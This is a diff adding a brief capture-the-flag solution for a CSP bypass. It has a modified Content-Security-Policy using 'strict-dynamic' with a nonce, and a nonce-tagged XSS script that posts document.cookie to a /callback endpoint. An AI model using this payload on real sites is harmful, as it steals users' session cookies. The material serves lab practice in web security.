@@ -1,0 +1,22 @@
+When arriving at the site you get a nonce value in the CSP directive. changning this from self to strict-dynamic 
+and adding the nonce to the XSS payload triggers the bot and returns the flag.
+
+
+
+default-src 'self';
+script-src 'strict-dynamic' 'nonce-ad2c63024e2cb57cf2f9b4628eb8ba2d';
+style-src 'self' 'unsafe-inline';
+img-src 'self' data:;
+object-src 'none';
+base-uri 'none';
+report-uri /csp-report
+
+--------------------------------------------------------------------
+
+<script nonce='ad2c63024e2cb57cf2f9b4628eb8ba2d'>
+   fetch('/callback', {
+       method: 'POST',
+       headers: { 'Content-Type': 'application/json' },
+       body: JSON.stringify({ cookies: document.cookie })
+   });
+</script>
